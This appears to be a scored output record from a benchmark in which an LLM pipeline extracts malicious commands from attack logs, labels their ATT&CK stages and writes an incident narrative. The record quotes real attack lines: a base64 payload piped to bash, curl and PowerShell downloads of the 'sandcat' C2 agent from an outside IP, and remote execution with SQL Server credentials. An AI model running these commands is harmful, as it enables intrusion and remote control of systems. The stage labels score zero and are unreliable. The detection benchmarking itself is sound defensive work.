@@ -1,0 +1,120 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.085.207:8443 -opid 9f726796 b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "kill -9 $(lsof -i:8080 -t)",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec \"cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip='https://124.223.85.207:8443';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+'/file/download';$wc=New-Object System.Net.WebClient;$wc.Headers.add('company_code',1234567);$wc.Headers.add('platform','windows');$wc.Headers.add('file','sandcat.go');$output='C:\\Users\\Public\\sandcat.exe';$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server htt...",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip='https://124.223.85.207:8443';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add('company_code',1234567);$wc.Headers.add('platform','windows');$wc.Headers.add('file','sandcat.go'); $output='C:\\Users\\Public\\sandcat.exe';$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 ...",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "/bin/bash -c ifconfig > /tmp/fake_network_info",
+        "stage": "Discovery"
+      },
+      {
+        "command": "chmod u+x /etc/network/if-up.d/init.scripts.sh",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "ifplugstatus eth0 &> /dev/null; [ $? == 0 ] || { rmdir etc/network/if-up.d/init.scripts.sh  ; } ",
+        "stage": "Execution"
+      },
+      {
+        "command": "01-ifupdown -e /etc/NetworkManager/dispatcher.d/01-ifupdown eth0 dhcp4-change",
+        "stage": "Execution"
+      },
+      {
+        "command": "20-chrony /etc/NetworkManager/dispatcher.d/20-chrony eth0 dhcp4-change",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond",
+        "stage": "Persistence"
+      },
+      {
+        "command": "popularity-cont /etc/cron.daily/popularity-contest --crond",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "A sophisticated attacker launched a multi-stage attack on the target environment. The attacker first obtained initial access through an unidentified vector. After gaining the foothold, they were able to use various tools such as credential dumping tools to extract sensitive data, execute lateral movement techniques by downloading the backdoor 'sandcat' and connecting to the command-and-control server. To maintain persistence, they modified legitimate system processes like Network Manager and exploited them to gain higher privileges.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42910,
+      "completion_tokens": 3850,
+      "total_tokens": 46760,
+      "wall_clock_s": 81.966,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3684210526315789,
+      "recall": 0.6363636363636364,
+      "f1": 0.4666666666666667,
+      "tp": 7,
+      "fp": 12,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 19,
+      "fn": 7,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.15384615384615385,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42910,
+      "completion_tokens": 3850,
+      "total_tokens": 46760,
+      "wall_clock_s": 81.966,
+      "parse_retries": 1
+    }
+  }
+}
